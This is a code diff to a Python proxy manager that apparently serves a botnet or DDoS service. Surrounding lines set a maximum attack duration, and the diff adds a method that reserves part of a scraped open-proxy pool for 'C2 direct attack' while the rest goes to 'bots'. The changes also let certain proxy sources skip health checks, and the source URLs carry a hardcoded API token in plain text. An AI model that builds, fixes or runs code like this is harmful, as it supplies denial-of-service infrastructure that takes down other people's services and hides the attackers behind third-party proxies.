@@ -31,11 +31,18 @@ MAX_ATTACK_DURATION = 43200
 HEALTH_CHECK_BATCH_SIZE = 50
 HEALTH_CHECK_TIMEOUT = 4
 
+# FIX #1: Health check test URLs - use multiple lightweight targets
+HEALTH_CHECK_URLS = [
+    "http://www.google.com/generate_204",
+    "http://www.cloudflare.com/cdn-cgi/trace",
+    "http://httpbin.org/ip",
+]
+
 # ========== PROXY SOURCE DEFINITION ==========
 class ProxySource:
     def __init__(self, name: str, url: str, interval: int,
                  format: str = "text", parser: str = "default",
-                 protocol: str = "http", priority: int = 5):
+                 protocol: str = "http", priority: int = 5, skip_health_check: bool = False):
         self.name = name
         self.url = url
         self.interval = interval
@@ -43,6 +50,7 @@ class ProxySource:
         self.parser = parser
         self.protocol = protocol
         self.priority = priority
+        self.skip_health_check = skip_health_check  # FIX #2: Trusted sources skip health check
         self.last_fetch = 0
         self.last_count = 0
         self.success_rate = 1.0
@@ -52,12 +60,12 @@ PROXY_SOURCES = [
     ProxySource(
         name="proxies.is_global",
         url="https://api.proxies.is/scraped?token=7k6e6J11371Y8H6whs0bc&timeout=15000&excludeASN=&includeASN=&excludeCountry=&includeCountry=&type=",
-        interval=180, format="json", parser="proxies.is", protocol="http", priority=10
+        interval=180, format="json", parser="proxies.is", protocol="http", priority=10, skip_health_check=True
     ),
     ProxySource(
         name="proxies.is_id",
         url="https://api.proxies.is/scraped?token=7k6e6J11371Y8H6whs0bc&timeout=15000&excludeASN=&includeASN=&excludeCountry=&includeCountry=ID&type=",
-        interval=180, format="json", parser="proxies.is", protocol="http", priority=10
+        interval=180, format="json", parser="proxies.is", protocol="http", priority=10, skip_health_check=True
     ),
     ProxySource(
         name="proxyscrape_api_http",
@@ -255,7 +263,7 @@ class ProxyData:
             uptime_minutes=data.get("uptime_minutes", 0.0),
         )
 
-# ========== PROXY MANAGER v8.1 — FIXED ==========
+# ========== PROXY MANAGER v8.2 — FIXED ==========
 class ProxyManager:
     def __init__(self):
         self.sources = PROXY_SOURCES
@@ -403,7 +411,8 @@ class ProxyManager:
 
     # ==================== MASS HEALTH CHECK ====================
     async def _check_single_proxy(self, proxy: ProxyData, test_url: str = None) -> Tuple[ProxyData, bool, float]:
-        url = test_url or "http://httpbin.org/ip"
+        # FIX #3: Rotate health check URLs to avoid single point of failure
+        url = test_url or random.choice(HEALTH_CHECK_URLS)
         proxy_url = f"http://{proxy.ip}:{proxy.port}"
         start_time = time.time()
 
@@ -417,7 +426,7 @@ class ProxyManager:
                     allow_redirects=False,
                 ) as resp:
                     elapsed = time.time() - start_time
-                    if resp.status in (200, 301, 302, 403, 429):
+                    if resp.status in (200, 204, 301, 302, 403, 429):
                         proxy.response_time = elapsed
                         proxy.success_count += 1
                         proxy.fail_streak = 0
@@ -487,8 +496,9 @@ class ProxyManager:
         if not proxies:
             return
 
-        if skip_health_check:
-            logger.info(f"[REFRESH] {source.name}: Storing {len(proxies)} proxies without health check (initial load)")
+        # FIX #4: Skip health check for trusted sources (proxies.is)
+        if skip_health_check or source.skip_health_check:
+            logger.info(f"[REFRESH] {source.name}: Storing {len(proxies)} proxies without health check (trusted source)")
             alive_proxies = proxies
         else:
             alive_proxies = await self._mass_health_check(proxies)
@@ -577,7 +587,7 @@ class ProxyManager:
     async def start_background_refresh(self):
         self._running = True
 
-        # FIX: Skip health check on initial load for fast startup
+        # FIX #5: Skip health check on initial load for fast startup (trusted sources only)
         await self.refresh_all(force=True, skip_health_check=True)
 
         for src in self.sources:
@@ -703,9 +713,45 @@ class ProxyManager:
             protocols=["http", "https", "socks5"]
         )
 
+    # FIX #6: New method for direct attack proxy reservation (20% of pool)
+    async def get_direct_attack_proxies(self, count: int = 500) -> List[str]:
+        """Get proxies reserved for C2 direct attack (20% of pool)."""
+        redis = await get_redis()
+
+        # Get total alive count
+        total_alive = await redis.zcard(self.alive_key)
+        if total_alive == 0:
+            logger.warning("[DIRECT] No proxies available for direct attack")
+            return []
+
+        # Reserve 20% of pool for direct attack, but max 500
+        reserve_count = min(count, max(50, total_alive // 5))
+
+        # Get from the end of the sorted set (slower proxies, less likely to be used by bots)
+        all_proxies = await redis.zrange(self.alive_key, 0, -1, withscores=True)
+
+        # Reverse to get slower proxies first (bots get fast ones, C2 gets slower ones)
+        all_proxies.reverse()
+
+        selected = []
+        for key, score in all_proxies[:reserve_count]:
+            proxy_json = await redis.hget(self.pool_key, key)
+            if not proxy_json:
+                continue
+            try:
+                proxy = ProxyData.from_dict(json.loads(proxy_json))
+                if proxy.speed_tier not in ("dead",):
+                    selected.append(proxy.url)
+            except:
+                continue
+
+        logger.info(f"[DIRECT] Reserved {len(selected)} proxies for direct attack (from {total_alive} total alive)")
+        return selected
+
     async def get_proxies_for_bot(self, bot_count: int = 1, proxies_per_bot: int = 100) -> List[List[str]]:
         total_needed = bot_count * proxies_per_bot
-        all_proxies = await self.get_mixed_proxies(count=total_needed * 2)
+        # FIX #7: Get 80% of requested count to leave 20% for direct attack
+        all_proxies = await self.get_mixed_proxies(count=int(total_needed * 1.25))
 
         if not all_proxies:
             return [[] for _ in range(bot_count)]
